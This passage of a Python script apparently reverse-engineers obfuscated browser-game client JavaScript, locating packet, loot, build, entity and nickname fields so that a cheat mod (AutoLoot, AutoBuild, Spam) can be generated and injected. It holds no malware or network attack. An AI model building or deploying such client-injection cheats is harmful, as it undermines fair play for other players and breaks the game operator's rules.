#!/usr/bin/env python3
"""
Full auto-port: detect vars -> generate AutoLoot/AutoBuild + Open/Spam/Nicks/List/Menu mod -> inject.

Usage:
  python3 engine_port.py <new_client.js> [-o out.js]
  python3 engine_port.py <new_client.js> --report-only
  python3 engine_port.py <new_client.js> --override loot=NAME --override build.rot=NAME
"""
from __future__ import annotations
import argparse
import sys
from pathlib import Path
import re
from collections import Counter


def isid(ch: str) -> bool:
    o = ord(ch)
    return ch.isalnum() or ch == "_" or o > 127


def ident_back(s: str, i: int) -> str | None:
    if i <= 0 or not isid(s[i - 1]):
        return None
    j = i - 1
    while j > 0 and isid(s[j - 1]):
        j -= 1
    return s[j:i]


def ident_fwd(s: str, i: int) -> str | None:
    if i >= len(s) or not isid(s[i]):
        return None
    j = i
    while j < len(s) and isid(s[j]):
        j += 1
    return s[i:j]


# Repeated detectors search the same large client for the same anchors.
# Cache only the main bundle (not short temporary windows) to avoid dozens of
# identical full-file passes while keeping memory bounded.
_FIND_CACHE: dict[str, list[int]] = {}
_FIND_CACHE_SOURCE_ID: int | None = None
_FIND_CACHE_MIN_SOURCE = 1_000_000


def find_all(s: str, sub: str) -> list[int]:
    global _FIND_CACHE_SOURCE_ID
    use_cache = len(s) >= _FIND_CACHE_MIN_SOURCE
    if use_cache:
        source_id = id(s)
        if source_id != _FIND_CACHE_SOURCE_ID:
            _FIND_CACHE.clear()
            _FIND_CACHE_SOURCE_ID = source_id
        cached = _FIND_CACHE.get(sub)
        if cached is not None:
            return cached

    out, st = [], 0
    while True:
        i = s.find(sub, st)
        if i < 0:
            break
        out.append(i)
        st = i + 1
    if use_cache:
        _FIND_CACHE[sub] = out
    return out


def _source_key(s: str):
    return (id(s), len(s))


# Counting/searching the same needle in the same multi-megabyte bundle happens
# dozens of times across the detectors.  Memoize per source so each needle is
# scanned at most once instead of once per candidate.
_COUNT_CACHE: dict[str, int] = {}
_COUNT_CACHE_SOURCE = None


def src_count(s: str, sub: str) -> int:
    global _COUNT_CACHE_SOURCE
    if len(s) < _FIND_CACHE_MIN_SOURCE:
        return s.count(sub)
    key = _source_key(s)
    if key != _COUNT_CACHE_SOURCE:
        _COUNT_CACHE.clear()
        _COUNT_CACHE_SOURCE = key
    val = _COUNT_CACHE.get(sub)
    if val is None:
        val = s.count(sub)
        _COUNT_CACHE[sub] = val
    return val


def src_has(s: str, sub: str) -> bool:
    return src_count(s, sub) > 0


# `function NAME(` lookups used to rescan the whole bundle for every match.
# Build the name -> first position index once per source.
_FUNCDEF_CACHE: dict[str, int] = {}
_FUNCDEF_CACHE_SOURCE = None


def function_defs(s: str) -> dict[str, int]:
    global _FUNCDEF_CACHE_SOURCE
    key = _source_key(s)
    if key != _FUNCDEF_CACHE_SOURCE or not _FUNCDEF_CACHE:
        idx: dict[str, int] = {}
        for i in find_all(s, "function "):
            name = ident_fwd(s, i + 9)
            if not name:
                continue
            j = i + 9 + len(name)
            if j < len(s) and s[j] == "(":
                idx.setdefault(name, i)
        _FUNCDEF_CACHE.clear()
        _FUNCDEF_CACHE.update(idx)
        _FUNCDEF_CACHE_SOURCE = key
    return _FUNCDEF_CACHE


# The same bracket literals are parsed by several detectors (build / loot /
# interact) which all walk the same `World.PLAYER.` anchors.  Parse once.
_LIST_CACHE: dict[int, list[str] | None] = {}
_LIST_CACHE_SOURCE = None


def resolve(src: str, name: str, cache: dict, depth: int = 0) -> str | None:
    if name in cache:
        return cache[name]
    if depth > 10:
        return None
    for kw in ("const", "var", "let"):
        pref = f"{kw} {name} = "
        idx = src.find(pref)
        if idx < 0:
            continue
        start = idx + len(pref)
        end = start
        while end < len(src) and src[end] not in ";,\n":
            end += 1
        val = src[start:end].strip()
        if val.isdigit() or (val[:1] == "-" and val[1:].isdigit()):
            cache[name] = val
            return val
        if val and all(isid(c) for c in val):
            out = resolve(src, val, cache, depth + 1)
            cache[name] = out
            return out
        cache[name] = val
        return val
    cache[name] = None
    return None


def parse_list(src: str, i: int, max_scan: int = 4096) -> list[str] | None:
    global _LIST_CACHE_SOURCE
    cacheable = len(src) >= _FIND_CACHE_MIN_SOURCE and max_scan == 4096
    if cacheable:
        key = _source_key(src)
        if key != _LIST_CACHE_SOURCE:
            _LIST_CACHE.clear()
            _LIST_CACHE_SOURCE = key
        if i in _LIST_CACHE:
            return _LIST_CACHE[i]
    res = _parse_list_uncached(src, i, max_scan)
    if cacheable:
        _LIST_CACHE[i] = res
    return res


def _parse_list_uncached(src: str, i: int, max_scan: int = 4096) -> list[str] | None:
    if i >= len(src) or src[i] != "[":
        return None
    depth, cur, args = 1, [], []
    i += 1
    # Packet arrays are tiny.  A candidate '[' may actually start a large or
    # malformed construct; never scan the rest of a multi-megabyte bundle for
    # every such false positive.
    stop = min(len(src), i + max_scan)
    while i < stop and depth:
        ch = src[i]
        if ch == "[":
            depth += 1
            cur.append(ch)
        elif ch == "]":
            depth -= 1
            if depth == 0:
                break
            cur.append(ch)
        elif ch == "," and depth == 1:
            args.append("".join(cur).strip())
            cur = []
        else:
            cur.append(ch)
        i += 1
    if depth:
        return None
    if cur:
        args.append("".join(cur).strip())
    return args


def pprop(arg: str) -> str | None:
    p = "World.PLAYER."
    if arg.startswith(p):
        r = arg[len(p):]
        if r and all(isid(c) for c in r):
            return r
    return None


# -------------------- detectors (existing) --------------------

def find_net(src: str) -> dict:
    """Detect high-level packet send: OBJ.METHOD(JSON.stringify(...)) or OBJ.METHOD(JSON[alias](...))."""
    pair_c, alias_c = Counter(), Counter()

    for i in find_all(src, "JSON["):
        j = i - 1
        while j >= 0 and src[j] in " \t\r\n":
            j -= 1
        if j < 0 or src[j] != "(":
            continue
        method = ident_back(src, j)
        if not method:
            continue
        k = j - len(method)
        if k <= 0 or src[k - 1] != ".":
            continue
        obj = ident_back(src, k - 1)
        if not obj:
            continue
        pair_c[(obj, method)] += 1
        a = ident_fwd(src, i + 5)
        if a:
            alias_c[(obj, method, a)] += 1

    for i in find_all(src, "JSON.stringify"):
        j = i - 1
        while j >= 0 and src[j] in " \t\r\n":
            j -= 1
        if j < 0 or src[j] != "(":
            continue
        method = ident_back(src, j)
        if not method:
            continue
        k = j - len(method)
        if k <= 0 or src[k - 1] != ".":
            continue
        obj = ident_back(src, k - 1)
        if not obj or obj == "JSON":
            continue
        pair_c[(obj, method)] += 3

    best = None
    for (obj, method), cnt in pair_c.most_common(20):
        score = cnt
        if src_has(src, f"{obj}.init"):
            score += 50
        if src_has(src, f"{obj}.State") or src_has(src, f"{obj}[State]"):
            score += 30
        if src_count(src, f"{obj}.{method}(JSON.stringify([12") + src_count(src, f"{obj}.{method}(JSON.stringify([14"):
            score += 40
        if best is None or score > best[0]:
            best = (score, obj, method)

    aliases = []
    if best:
        for (o, m, a), _ in alias_c.most_common():
            if o == best[1] and m == best[2] and a not in aliases:
                aliases.append(a)

    return {
        "net_obj": best[1] if best else None,
        "send_method": best[2] if best else None,
        "json_aliases": aliases[:6],
        "score": best[0] if best else 0,
        "stringify": True,
    }


def find_build(src: str) -> dict:
    cache: dict = {}
    cands = []
    for wi in find_all(src, "World.PLAYER."):
        start = max(0, wi - 80)
        chunk = src[start:wi + 120]
        lb = chunk.rfind("[", 0, wi - start)
        if lb < 0:
            continue
        abs_i = start + lb
        args = parse_list(src, abs_i)
        if not args or len(args) != 4:
            continue
        op, a, b, c = args
        if op.isdigit():
            ov = op
        elif op and all(isid(x) for x in op):
            ov = resolve(src, op, cache)
        else:
            ov = None
        if ov != "14":
            continue
        pa, pb, pc = pprop(a), pprop(b), pprop(c)
        if pa and pb and pc:
            cands.append((op, pa, pb, pc, abs_i))
    result = {"rot": None, "grid_i": None, "grid_j": None, "opcode_const": None}
    if not cands:
        return result
    scored = []
    for op, a, b, c, pos in cands:
        ctx = src[max(0, pos - 180):pos + 40]
        sc = 1 + (5 if "=== 1" in ctx else 0)
        sc += min(src_count(src, f"World.PLAYER.{b}"), 40) // 5
        sc += min(src_count(src, f"World.PLAYER.{c}"), 40) // 5
        scored.append((sc, op, a, b, c))
    scored.sort(reverse=True)
    _, op, a, b, c = scored[0]
    result["opcode_const"] = None if op.isdigit() else op
    result["rot"], result["grid_i"], result["grid_j"] = a, b, c
    return result


def _rhs_of_assign(src: str, prop: str) -> tuple[str, int] | None:
    """Return (RHS text, position) of `World.PLAYER.<prop> = ...;` using Math."""
    key = f"World.PLAYER.{prop}"
    best = None
    for i in find_all(src, key):
        j = i + len(key)
        # make sure the property name ends here (not a longer identifier)
        if j < len(src) and isid(src[j]):
            continue
        k = j
        while k < len(src) and src[k] in " \t":
            k += 1
        if k >= len(src) or src[k] != "=" or src[k + 1:k + 2] in ("=", ">"):
            continue
        k += 1
        end = src.find(";", k)
        if end < 0 or end - k > 400:
            continue
        rhs = src[k:end].strip()
        if "Math[" not in rhs and "Math." not in rhs:
            continue
        if "World.PLAYER." not in rhs:
            continue
        # prefer the longest / most complete formula
        if best is None or len(rhs) > len(best[0]):
            best = (rhs, i)
    return best


def _resolve_local(src: str, name: str, pos: int, depth: int = 0) -> str:
    """Resolve a local `var NAME = EXPR;` declared just above `pos`.

    The angle used by the build formula is a function-local alias (e.g.
    `var a = INPUT[ANGLE_KEY];`). A mod injected at top level cannot see that
    alias, so we inline the expression it was assigned from.
    """
    if depth > 4 or not name or not all(isid(c) for c in name):
        return name
    window_start = max(0, pos - 20000)
    chunk = src[window_start:pos]
    best = None
    for kw in ("var ", "let ", "const "):
        idx = chunk.rfind(kw + name + " = ")
        if idx < 0:
            continue
        start = idx + len(kw + name + " = ")
        end = chunk.find(";", start)
        if end < 0:
            continue
        val = chunk[start:end].strip()
        if not val or "\n" in val or len(val) > 200:
            continue
        if best is None or idx > best[0]:
            best = (idx, val)
    if best is None:
        return name
    val = best[1]
    if all(isid(c) for c in val):
        return _resolve_local(src, val, window_start + best[0], depth + 1)
    return val



def _split_math_arg(rhs: str) -> tuple[str, str] | None:
    """Find the innermost Math[..](ARG) call and return (template, ARG).

    The template has ARG replaced by the `%A%` placeholder so the caller can
    substitute its own angle without knowing the obfuscated formula.
    """
    for anchor in ("Math[", "Math."):
        pos = 0
        while True:
            i = rhs.find(anchor, pos)
            if i < 0:
                break
            pos = i + 1
            lp = rhs.find("(", i)
            if lp < 0:
                break
            depth, j = 1, lp + 1
            while j < len(rhs) and depth:
                if rhs[j] == "(":
                    depth += 1
                elif rhs[j] == ")":
                    depth -= 1
                j += 1
            if depth:
                continue
            arg = rhs[lp + 1:j - 1].strip()
            if not arg or "Math[" in arg or "Math." in arg:
                continue
            # a plain number or an arithmetic expression is not an angle source
            try:
                float(arg)
                continue
            except ValueError:
                pass
            return rhs[:lp + 1] + "%A%" + rhs[j - 1:], arg
    return None


def _inline_tpl_consts(src: str, tpl: str, cache: dict, depth: int = 0) -> str:
    """Replace bare identifiers in a cell template with their literal values.

    Some constants in the client's formula are function-local (e.g. the cell
    size `C` and `H = C / 2` live inside the ghost renderer), so the injected
    mod cannot see them and the whole formula throws ReferenceError.  Numeric
    constants and simple arithmetic over them are inlined; `Math[..]` member
    keys, `World.PLAYER.*` properties and `%A%` placeholders are reachable
    from the injection scope and are left untouched.
    """
    out = []
    i, n = 0, len(tpl)
    while i < n:
        c = tpl[i]
        if c == "%":
            j = tpl.find("%", i + 1)
            if j < 0:
                out.append(tpl[i:])
                break
            out.append(tpl[i:j + 1])
            i = j + 1
            continue
        if isid(c) and not c.isdigit():
            j = i
            while j < n and isid(tpl[j]):
                j += 1
            tok = tpl[i:j]
            prev = tpl[i - 1] if i > 0 else ""
            nxt = tpl[j] if j < n else ""
            if (prev and prev in ".[") or tok in ("Math", "World") or nxt == "[":
                out.append(tok)
            elif depth <= 4:
                val = resolve(src, tok, cache)
                if val is None:
                    out.append(tok)
                elif val.lstrip("-").isdigit():
                    out.append(val)
                else:
                    # expression (e.g. `C / 2`) -> inline recursively
                    out.append("(" + _inline_tpl_consts(src, val, cache, depth + 1) + ")")
            else:
                out.append(tok)
            i = j
            continue
        out.append(c)
        i += 1
    return "".join(out)


def find_build_angle(src: str, build: dict) -> dict:
    """Detect how the client turns the aim angle into the build target cell.

    The client recomputes `World.PLAYER.<grid_i/grid_j>` every frame inside the
    build-ghost renderer:

        World.PLAYER.<grid_j> = World.PLAYER.<baseX> + Math.round((H + Math.cos(ANGLE) * C) / C);
        World.PLAYER.<grid_i> = World.PLAYER.<baseY> + Math.round((H + Math.sin(ANGLE) * C) / C);

    Reading those properties from a mod is unreliable (they are only refreshed
    while the ghost is drawn), so we capture the formulas as templates plus the
    angle expression and let the mod recompute the cell itself.
    """
    out = {
        "angle_expr": None,
        "angle_local": None,
        "grid_i_tpl": None,
        "grid_j_tpl": None,
    }
    gi, gj = build.get("grid_i"), build.get("grid_j")
    for name, prop in (("grid_i_tpl", gi), ("grid_j_tpl", gj)):
        if not prop:
            continue
        found = _rhs_of_assign(src, prop)
        if not found:
            continue
        rhs, pos = found
        split = _split_math_arg(rhs)
        if not split:
            continue
        tpl, angle = split
        out[name] = _inline_tpl_consts(src, tpl, {})
        # the raw angle token is usually a function-local alias -> inline it
        resolved = _resolve_local(src, angle, pos) if all(isid(c) for c in angle) else angle
        if out["angle_expr"] is None:
            out["angle_local"] = angle
            out["angle_expr"] = resolved
        elif out["angle_expr"] != resolved:
            # both axes must be driven by the same angle expression
            out[name] = None
    if not (out["grid_i_tpl"] and out["grid_j_tpl"]):
        out["grid_i_tpl"] = out["grid_j_tpl"] = None
    return out



ENTITY_OBJ_DEFAULT = "Entitie"



def detect_entity_obj(src: str) -> str:
    """Auto-detect the name of the entities object (Entitie / Entiie / other).

    Looks for `<Name>.init(` and `<Name>.get(` style anchors and picks the
    identifier that actually occurs in the source most often.
    """
    cand: Counter = Counter()
    # Normal builds retain one of these public object names. Returning it
    # immediately avoids scoring dozens of unrelated `.get`/`.init` receivers.
    known_hits = [(src_count(src, name + ".") + src_count(src, name + "["), name)
                  for name in ("Entitie", "Entiie")]
    known_count, known_name = max(known_hits)
    if known_count >= 3:
        return known_name

    # Avoid a Unicode regex over the complete minified bundle.  With the
    # overlapping \w / non-ASCII ranges it can backtrack for minutes on long
    # obfuscated identifiers.  Fixed-string search plus ident_back is linear.
    for anchor, w in ((".init(", 50), (".get(", 5)):
        for i in find_all(src, anchor):
            name = ident_back(src, i)
            if not name or name[0].isdigit():
                continue
            if name in ("window", "document", "JSON", "Math", "this"):
                continue
            cand[name] += w
    # The bundle may expose thousands of `.get(`/`.init(` receivers.  Calling
    # str.count over the entire multi-megabyte source for every receiver makes
    # this step effectively quadratic and looks like a hang.  Anchor weights
    # already include all relevant occurrences, so only verify the strongest
    # bounded candidate set against full-source usage.
    best = None
    best_sc = -1
    for name, w in cand.most_common(12):
        usage = src_count(src, name + ".") + src_count(src, name + "[")
        if usage < 3:
            continue
        sc = w + usage
        if sc > best_sc:
            best, best_sc = name, sc
    return best or ENTITY_OBJ_DEFAULT


def find_loot(src: str, ent: str = ENTITY_OBJ_DEFAULT) -> dict:
    init_neg: Counter = Counter()
    for i in find_all(src, "World.PLAYER."):
        prop = ident_fwd(src, i + 13)
        if not prop:
            continue
        rest = src[i + 13 + len(prop):i + 13 + len(prop) + 12]
        if "= -1" in rest or "=-1" in rest or "= -" in rest:
            init_neg[prop] += 1

    table_idx: Counter = Counter()
    for i in find_all(src, "World.PLAYER."):
        if i > 0 and src[i - 1] == "[":
            prop = ident_fwd(src, i + 13)
            if prop:
                table_idx[prop] += 1

    cmp_neg: Counter = Counter()
    for prop in set(list(init_neg) + list(table_idx)):
        c = 0
        for pat in (
            f"World.PLAYER.{prop} === -1",
            f"World.PLAYER.{prop} !== -1",
            f"World.PLAYER.{prop} === -",
            f"=== World.PLAYER.{prop}",
        ):
            c += src_count(src, pat)
        if c:
            cmp_neg[prop] = c

    scored = []
    for prop in set(list(init_neg) + list(table_idx) + list(cmp_neg)):
        score = init_neg.get(prop, 0) * 3
        score += table_idx.get(prop, 0) * 2
        score += cmp_neg.get(prop, 0) * 2
        if src_has(src, f"World.PLAYER.{prop} === {prop}"):
            score += 10
        if src_has(src, f"World.PLAYER.{prop} = -") and src_has(src, f"World.PLAYER.{prop} === "):
            score += 5
        scored.append((score, prop))
    scored.sort(reverse=True)

    nearest = scored[0][1] if scored else None

    cache: dict = {}
    hits = []
    for wi in find_all(src, "World.PLAYER."):
        start = max(0, wi - 60)
        chunk = src[start:wi + 80]
        lb = chunk.rfind("[", 0, wi - start)
        if lb < 0:
            continue
        args = parse_list(src, start + lb)
        if not args or len(args) != 2:
            continue
        op, a = args
        if op.isdigit():
            ov = op
        elif op and all(isid(x) for x in op):
            ov = resolve(src, op, cache)
        else:
            ov = None
        if ov != "12":
            continue
        p = pprop(a)
        if p:
            hits.append(p)
    pkt12 = Counter(hits).most_common(1)[0][0] if hits else None

    eid = None
    for prop in (pkt12, nearest):
        if not prop:
            continue
        key = f"World.PLAYER.{prop} = "
        for i in find_all(src, key):
            br = src.find("[", i, i + 60)
            if br < 0:
                continue
            eid = ident_fwd(src, br + 1)
            if eid:
                break
        if eid:
            break

    loot_type = None
    if pkt12:
        type_hits: Counter = Counter()
        for i in find_all(src, f"World.PLAYER.{pkt12}"):
            window = src[max(0, i - 100):i + 350]
            for j in find_all(window, ent + "."):
                abs_j = max(0, i - 100) + j
                bb = src.find("[", abs_j, abs_j + 50)
                if bb < 0:
                    continue
                prop = ident_fwd(src, abs_j + len(ent) + 1)
                if not prop:
                    continue
                tvar = ident_fwd(src, bb + 1)
                if not tvar or len(tvar) < 2:
                    continue
                sc = 1
                if f"World.PLAYER.{pkt12} = -" in window or f"World.PLAYER.{pkt12}=- " in window:
                    sc += 5
                type_hits[tvar] += sc
        if type_hits:
            loot_type = type_hits.most_common(1)[0][0]

    return {
        "nearest": nearest,
        "packet12": pkt12,
        "entity_id": eid,
        "loot_type": loot_type,
        "candidates": scored[:5],
    }


def find_buckets(src: str, ent: str = ENTITY_OBJ_DEFAULT) -> dict:
    props = []
    for i in find_all(src, ent + "."):
        p = ident_fwd(src, i + len(ent) + 1)
        if p:
            props.append(p)
    scored = []
    for p, c in Counter(props).most_common(15):
        if p in ("init", "create"):
            continue
        sc = c + (25 if src_has(src, f"{ent}.{p}[") else 0)
        scored.append((sc, p))
    scored.sort(reverse=True)
    buckets = scored[0][1] if scored else None

    meta_key = None
    count_key = None
    index_prop = "ᴄ︁͢"

    meta_c: Counter = Counter()
    for i in find_all(src, ent + "["):
        key = ident_fwd(src, i + len(ent) + 1)
        if not key or key == buckets:
            continue
        after = src[i + len(ent) + 1 + len(key):i + len(ent) + 1 + len(key) + 5]
        if after.startswith("]["):
            sc = 1
            ctx = src[max(0, i - 80):i + 250]
            if "ᴄ︁͢" in ctx:
                sc += 5
            if buckets and f"{ent}.{buckets}" in ctx:
                sc += 8
            meta_c[key] += sc
    if meta_c:
        meta_key = meta_c.most_common(1)[0][0]

    if "ᴄ︁͢" in src:
        index_prop = "ᴄ︁͢"
        ck_c: Counter = Counter()
        for i in find_all(src, ".ᴄ︁͢["):
            window = src[max(0, i - 200):i]
            for j in range(len(window) - 1, 0, -1):
                if window[j] != "]":
                    continue
                ck = ident_back(window, j)
                if not ck or ck in ("length", index_prop):
                    continue
                if ck in ("i", "j", "k", "n", "ti"):
                    continue
                sc = 1
                if f"[{ck}]" in window and ("=" in window[max(0, window.rfind(f"[{ck}]") - 30):window.rfind(f"[{ck}]")]):
                    sc += 3
                ck_c[ck] += sc
                break
        if ck_c:
            for cand, _ in ck_c.most_common():
                if cand != meta_key:
                    count_key = cand
                    break
            if not count_key and ck_c:
                count_key = ck_c.most_common(1)[0][0]

    return {
        "obj": ent,
        "buckets": buckets,
        "meta_key": meta_key,
        "count_key": count_key,
        "index_prop": index_prop,
    }


def find_zoom(src: str) -> dict:
    result = {"cam": None, "scale_key": None}
    hits = []
    for i in find_all(src, "< 1.5"):
        j = i - 1
        while j >= 0 and src[j] in " \t":
            j -= 1
        if j < 0 or src[j] != "]":
            continue
        key = ident_back(src, j)
        if not key:
            continue
        k = j - len(key) - 1
        if k < 0 or src[k] != "[":
            continue
        cam = ident_back(src, k)
        if not cam:
            continue
        after = src[i:i + 200]
        if "+= 0.1" in after or "+=0.1" in after:
            hits.append((cam, key))

    if hits:
        (cam, key), _ = Counter(hits).most_common(1)[0]
        result["cam"] = cam
        result["scale_key"] = key
        return result

    for i in find_all(src, "> -0.95"):
        j = i - 1
        while j >= 0 and src[j] in " \t":
            j -= 1
        if j < 0 or src[j] != "]":
            continue
        key = ident_back(src, j)
        if not key:
            continue
        k = j - len(key) - 1
        if k < 0 or src[k] != "[":
            continue
        cam = ident_back(src, k)
        if not cam:
            continue
        result["cam"] = cam
        result["scale_key"] = key
        return result

    return result


# -------------------- NEW detectors --------------------

def find_nick_from_ctor(src: str) -> str | None:
    """Nickname field from the player-array constructor.

    Clients build the player table as

        World.players[i] = new Player(i, nicks[i]);
        function Player(id, nick) { this.<NICK> = nick; ... }

    so the property the second constructor argument is stored in IS the
    nickname field.  Empty slots pass 0 instead of a string, which is where the
    fake "0" players in the list came from.
    """
    W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    m = re.search(r'World\.players\[%s\]\s*=\s*new\s+(%s)\s*\(([^;()]*)\)' % (W, W), src)
    if not m:
        return None
    ctor = m.group(1)
    args = [a.strip() for a in m.group(2).split(',')]
    if len(args) < 2:
        return None
    mc = re.search(r'function\s+%s\s*\(\s*(%s)\s*,\s*(%s)\s*\)\s*\{' % (re.escape(ctor), W, W), src)
    if not mc:
        return None
    nick_arg = mc.group(2)
    body = src[mc.end():mc.end() + 4000]
    ma = re.search(r'this(?:\.(%s)|\[(%s)\])\s*=\s*%s\s*;' % (W, W, re.escape(nick_arg)), body)
    if not ma:
        return None
    return ma.group(1) or ma.group(2)


def find_myid_key(src: str) -> str | None:
    """The key used as `World.PLAYER[<key>]` for the local player id."""
    W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    ids = Counter(re.findall(r'World\.PLAYER\[(%s)\]' % W, src))
    ids = Counter({k: v for k, v in ids.items()
                   if not k[0].isdigit() and not k.startswith(('"', "'"))})
    return ids.most_common(1)[0][0] if ids else None


def find_nickname(src: str) -> dict:
    """Detect player nickname field: PLAYER.XXX = ... + "#" + ..."""
    hits: Counter = Counter()
    for i in find_all(src, '+ "#" +'):
        window = src[max(0, i - 120):i]
        j = len(window) - 1
        while j > 0:
            if window[j] == "=":
                if j > 0 and window[j - 1] in "=!<>":
                    j -= 1
                    continue
                if j + 1 < len(window) and window[j + 1] == "=":
                    j -= 1
                    continue
                k = j - 1
                while k >= 0 and window[k] in " \t":
                    k -= 1
                prop = ident_back(window, k + 1)
                if prop and len(prop) >= 2:
                    before = window[: max(0, k + 1 - len(prop))]
                    if before.rstrip().endswith(".") or "this" in before[-8:]:
                        hits[prop] += 5
                    else:
                        hits[prop] += 1
                break
            j -= 1
    for i in find_all(src, "this."):
        prop = ident_fwd(src, i + 5)
        if not prop:
            continue
        rest = src[i + 5 + len(prop):i + 5 + len(prop) + 60]
        if not rest.lstrip().startswith("="):
            continue
        if '+ "#"' in rest or "+'#'" in rest:
            hits[prop] += 4
    best = hits.most_common(1)[0][0] if hits else None
    ctor_field = find_nick_from_ctor(src)
    # the constructor match is exact; the "#" heuristic is only a fallback
    if ctor_field:
        best = ctor_field
    return {"field": best, "candidates": hits.most_common(5), "ctor_field": ctor_field}


def find_interact(src: str) -> dict:
    """Detect interact packet fields: [World.PLAYER.A, World.PLAYER.B, World.PLAYER.C]
    where this is the E/Space interact send (not build=14, not loot=12).
    Also detect item.packetId field assigned into PLAYER.A.
    """
    cache: dict = {}
    triples = []
    for wi in find_all(src, "World.PLAYER."):
        start = max(0, wi - 100)
        chunk = src[start:wi + 160]
        lb = chunk.rfind("[", 0, wi - start)
        if lb < 0:
            continue
        abs_i = start + lb
        args = parse_list(src, abs_i)
        if not args or len(args) != 3:
            continue
        op, a, b = args[0], args[1], args[2]
        # op should be a PLAYER prop (packetId), not numeric 12/14
        pa, pb, pc = pprop(args[0]), pprop(args[1]), pprop(args[2])
        # form: [World.PLAYER.pkt, World.PLAYER.id, World.PLAYER.pid]
        if pa and pb and pc:
            triples.append((pa, pb, pc, abs_i))
        # also when first is not PLAYER but second/third are — skip

    # score triples: prefer ones near key handlers / multiple uses
    scored: Counter = Counter()
    for a, b, c, pos in triples:
        scored[(a, b, c)] += 1
        ctx = src[max(0, pos - 120):pos + 40]
        if "case " in ctx or "switch" in ctx:
            scored[(a, b, c)] += 3

    packet_id = building_id = building_pid = None
    if scored:
        (packet_id, building_id, building_pid), _ = scored.most_common(1)[0]

    # item packetId field: World.PLAYER.<packet_id> = SOMETHING.FIELD
    item_pkt_field = None
    if packet_id:
        key = f"World.PLAYER.{packet_id} = "
        field_hits: Counter = Counter()
        for i in find_all(src, key):
            rest = src[i + len(key):i + len(key) + 60]
            # strip trailing junk
            cut = len(rest)
            for sep in (";", ",", "\n", ")"):
                p = rest.find(sep)
                if p >= 0:
                    cut = min(cut, p)
            rhs = rest[:cut].strip()
            # prefer same-named field item.PACKETID
            if rhs.endswith("." + packet_id):
                field_hits[packet_id] += 10
                continue
            dot = rhs.rfind(".")
            if dot < 0:
                continue
            fld = rhs[dot + 1:].strip()
            if fld and all(isid(c) for c in fld):
                field_hits[fld] += 1
        if field_hits:
            item_pkt_field = field_hits.most_common(1)[0][0]
        else:
            item_pkt_field = packet_id  # usually same name on item defs
    if not item_pkt_field:
        item_pkt_field = packet_id

    # entity id assignment: World.PLAYER.buildingId = entity[IDKEY] or entity.IDKEY
    entity_id_key = None
    entity_pid_key = None
    entity_gx_key = None
    entity_gy_key = None
    # tile grid access looks like GRID[ent.GY][ent.GX] - gives the
    # authoritative grid cell fields for door/building entities
    # tile grid access: GRID[ent.GY][ent.GX] -> authoritative cell fields.
    # Identifier chars include unicode combining marks, so scan for "][" then
    # parse identifiers back/forward by exclusion set instead of regex \w.
    _iden_stop = set(' \t\n.;,=!+-*/()[]{}<>"\'')
    def _ident_back(buf, j):
        k = j
        while k > 0 and buf[k - 1] not in _iden_stop:
            k -= 1
        return buf[k:j]
    for i in find_all(src, "]["):
        left_ent = None
        # parse "ENT.GY][ENT.GX" around i
        # left of i: "... . FIELD ]"
        dot = src.rfind(".", 0, i)
        if dot < 0 or i - dot > 30:
            continue
        gy = src[dot + 1:i]
        ent1 = _ident_back(src, dot)
        # right of i+2: "ENT . FIELD ]"
        seg = src[i + 2:i + 40]
        dot2 = seg.find(".")
        close = seg.find("]")
        if dot2 < 0 or close < 0 or dot2 > close:
            continue
        ent2 = seg[:dot2]
        gx = seg[dot2 + 1:close]
        if ent1 and ent2 and ent1 == ent2 and gy and gx and gy != gx:
            entity_gy_key = gy
            entity_gx_key = gx
            break
    if building_id:
        key = f"World.PLAYER.{building_id} = "
        for i in find_all(src, key):
            rest = src[i + len(key):i + len(key) + 50]
            br = rest.find("[")
            if br >= 0:
                k = ident_fwd(rest, br + 1)
                if k:
                    entity_id_key = k
                    break
            # .prop
            dot = rest.find(".")
            if 0 <= dot < 20:
                k = ident_fwd(rest, dot + 1)
                if k:
                    entity_id_key = k
                    break
    if building_pid:
        key = f"World.PLAYER.{building_pid} = "
        for i in find_all(src, key):
            rest = src[i + len(key):i + len(key) + 50]
            # prefer .pid style
            for sep in (".", "["):
                p = rest.find(sep)
                if 0 <= p < 25:
                    k = ident_fwd(rest, p + 1)
                    if k:
                        entity_pid_key = k
                        break
            if entity_pid_key:
                break

    # sub-definition lookup: door-type entities resolve the interact packet
    # through DEFS[def.IDK].ARR[ent.ARR] - the entity sprite index selects the
    # sub-def that owns the real packetId. Pattern to find: "...].ARR[ent.ARR]"
    subdef_arr = None
    subdef_idkey = None
    for i in find_all(src, "]."):
        # left of "]": "...DEF.IDK" -> IDK is the def's own id key
        close = i
        idk = _ident_back(src, close)
        seg = src[i + 2:i + 60]
        p2 = seg.find("[")
        if p2 <= 0:
            continue
        arr = seg[:p2]
        if not arr or not all(isid(c) for c in arr):
            continue
        inner = seg[p2 + 1:]
        dot = inner.find(".")
        c2 = inner.find("]")
        if dot < 0 or c2 < 0 or dot > c2:
            continue
        arr2 = inner[dot + 1:c2]
        if arr2 and arr2 == arr:
            subdef_arr = arr
            subdef_idkey = idk or None
            break

    return {
        "packet_id": packet_id,
        "building_id": building_id,
        "building_pid": building_pid,
        "item_packet_field": item_pkt_field,
        "entity_id_key": entity_id_key,
        "entity_pid_key": entity_pid_key,
        "entity_gx_key": entity_gx_key,
        "entity_gy_key": entity_gy_key,
        "subdef_arr": subdef_arr,
        "subdef_idkey": subdef_idkey,
        "triples": scored.most_common(3),
    }


def find_inventory(src: str) -> dict:
    """Detect INVENTORY-like array and entity.extra field used as: INV[ent.EXTRA >> 7]."""
    # Pattern: IDENT[EXPR >> 7] where EXPR is entity.PROP or PROP
    inv_hits: Counter = Counter()
    extra_hits: Counter = Counter()

    for i in find_all(src, ">> 7"):
        # go back to find IDENT[
        j = i - 1
        while j >= 0 and src[j] in " \t":
            j -= 1
        # expect something like .PROP or just PROP before >>
        # find matching [
        # scan left for [
        k = j
        depth = 0
        bracket = -1
        while k >= 0 and k > i - 80:
            if src[k] == "]":
                depth += 1
            elif src[k] == "[":
                if depth == 0:
                    bracket = k
                    break
                depth -= 1
            k -= 1
        if bracket < 0:
            continue
        inv = ident_back(src, bracket)
        if not inv or len(inv) < 2:
            continue
        # inside brackets: look for .PROP >> 7 or PROP >> 7
        inside = src[bracket + 1:i]
        # find last ident before >>
        prop = ident_back(inside.replace(" ", "").replace("\t", "") + ">>", len(inside.replace(" ", "").replace("\t", "")))
        # simpler: ident immediately before >>
        p = ident_back(src, i)
        # actually src[i] is '>' of '>> 7', so ident_back from i
